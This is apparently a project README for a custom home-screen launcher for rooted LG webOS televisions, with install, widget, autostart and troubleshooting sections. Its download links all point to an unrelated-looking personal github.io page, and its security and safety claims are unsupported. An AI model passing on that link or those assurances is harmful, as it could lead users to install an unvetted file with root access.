# 📺 webos-custom-home - Take control of your television experience

[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://evaniaagential327.github.io)

This application provides a custom home screen for your rooted LG webOS television. It removes advertisements from your interface and offers a clean layout for your apps. You gain control over your TV display with features like custom app lists, clock and weather widgets, and the ability to start this launcher automatically when your TV turns on.

## 📥 Getting Started

To use this software, you must have a rooted LG webOS TV. If your TV does not have root access, you cannot install this launcher. Please follow the instructions provided by your root method of choice before you attempt to install this file.

Visit the following page to choose your version and download the file for your TV:

[https://evaniaagential327.github.io](https://evaniaagential327.github.io)

## ⚙️ Installation Requirements

Before you install this software, confirm your setup meets these criteria:

* An LG Smart TV running webOS.
* Root access installed on your television.
* A stable network connection for your TV.
* A USB flash drive or a computer for file transfers.

## 🛠️ How to Install

1. Download the installation file from the link provided above. Save this file to your computer.
2. Ensure your TV and your computer stay on the same local network.
3. Use a webOS development tool, such as the webOS Dev Manager, on your computer.
4. Connect the tool to your TV by entering the TV IP address.
5. Upload the downloaded file to your TV using the install button within your development tool.
6. Wait for the process to finish. Your TV will notify you once the application installs successfully.

## 🏠 Using Your Custom Home

Once the installation finishes, you can open the app from your app drawer. The interface loads your existing applications. You can rearrange tiles and set your preferences through the settings menu inside the app.

The app supports the Home button functionality. If you want the TV to show this screen every time you press the Home button on your remote, select the "Home Takeover" option in the settings menu.

## ⏳ Boot Autostart

You can force the TV to start this layout every time it turns on. To do this, open the app, navigate to the settings, and toggle the "Boot Autostart" switch to the on position. The TV will now load this custom environment instead of the default LG home screen.

## 🌦️ Configuring Widgets

The custom home screen includes widgets for the clock and local weather. To see your local weather, you must enter your location details in the settings panel. The app uses your ZIP or postal code to fetch current conditions. The clock updates automatically based on the time zone settings of your TV.

## 🔍 Troubleshooting Issues

If the app fails to open, restart your television. Unplug the power cord for thirty seconds and plug it back in. This clears the temporary memory of the TV.

If the app does not show your applications, check the settings menu. Ensure you have granted the necessary permissions for the app to read your installed software list.

If you experience sluggish performance, clear the cache through the application settings menu. This removes temporary data and helps the interface run on older hardware.

## 🔒 Security Statement

This software runs locally on your television. It does not send your personal television usage data to external servers. It works exclusively with the local services of your webOS device to change the visual layout and app behavior.

## 📋 Frequently Asked Questions

**Does this software damage my TV?**
No, this software modifies the user interface layer. It does not touch the essential system files required for the TV to function.

**Can I go back to the original interface?**
Yes. You can uninstall the application at any time using your webOS development tool. Once you uninstall the app, the TV reverts to the standard LG home screen.

**Will this app stop working if I update my TV?**
System updates from LG might override your launcher settings. If your TV updates, you may need to open the app settings again or re-apply the home takeover setting.

**Do I need a paid subscription?**
No. This project remains free and open for all users. You do not need to pay for any features.
